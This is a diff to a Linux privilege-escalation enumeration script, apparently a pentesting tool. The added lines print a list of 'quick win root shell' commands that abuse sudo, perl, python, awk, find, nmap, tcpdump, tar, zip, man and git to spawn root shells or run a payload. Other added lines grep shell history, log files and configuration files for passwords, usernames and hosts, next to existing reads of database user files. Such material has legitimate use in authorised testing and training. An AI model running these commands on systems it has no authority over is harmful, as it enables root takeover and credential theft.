@@ -2,6 +2,26 @@ banner () {
   echo "******************************************************"
   echo "[i] $1"
 }
+banner "Quick Win?" && sudo -l 2>/dev/null  && sudo -lll 2>/dev/null && sudo -V 2>/dev/null 
+
+cat << EndOfMessage
+Try these for quick win root shells...
+sudo su
+perl -e 'exec "/bin/bash";'
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+When you execute one of theses program less, more, nano, vi, the man, ftp, mysql, psql you can execute some code into like that !bash	Launch a bash as root
+awk 'BEGIN {system("/bin/bash")}'
+find /home -exec /bin/bash \;	
+tcpdump -i lo -w /dev/null -W 1 -G 1 -z /tmp/payload.sh
+tar c a.tar -I ./payload.sh a	
+zip z.zip a -T -TT ./payload.sh
+man -P /tmp/payload.sh man
+export PAGER=./payload.sh git -p help
+export PATH=/tmp:$PATH ln -sf /tmp/payload.sh /tmp/git-help git --exec-path=/tmp help
+ls -la .bashrc export HOME=. bash
+nmap --interactive !bash
+EndOfMessage
 
 banner "System Info" && uname -a
 banner "Available Compilers" && dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null
@@ -118,7 +138,15 @@ ls -ahlR /home/ 2>/dev/null
 banner "Check 17: Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords"
 cat /var/apache2/config.inc 2>/dev/null
 cat /var/lib/mysql/mysql/user.MYD 2>/dev/null
-cat /root/anaconda-ks.cfg 2>/dev/null
+cat /root/anaconda-ks.cfg 2>/dev/null	
+banner "Command history of current user"
+history
+banner "User history, interesting information"
+history | grep -B4 -A3 -i 'passwd\|ssh\|host\|nc\|ping' 2>/dev/null	
+banner "Log file in /var/log for password, login, or email information"
+grep -B3 -A3 -i 'pass\|password\|login\|username\|email\|mail\|host\|ip' /var/log/*.log 2>/dev/null	
+banner "Configuration files which contain interesting information"
+find / -maxdepth 4 -name '*.conf' -type f -exec grep -Hn 'pass\|password\|login\|username\|email\|mail\|host\|ip' {} \; 2>/dev/null	
 
 banner "Check 18: What has the user being doing? Is there any password in plain text? What have they been edting?"
 cat ~/.bash_history 2>/dev/null
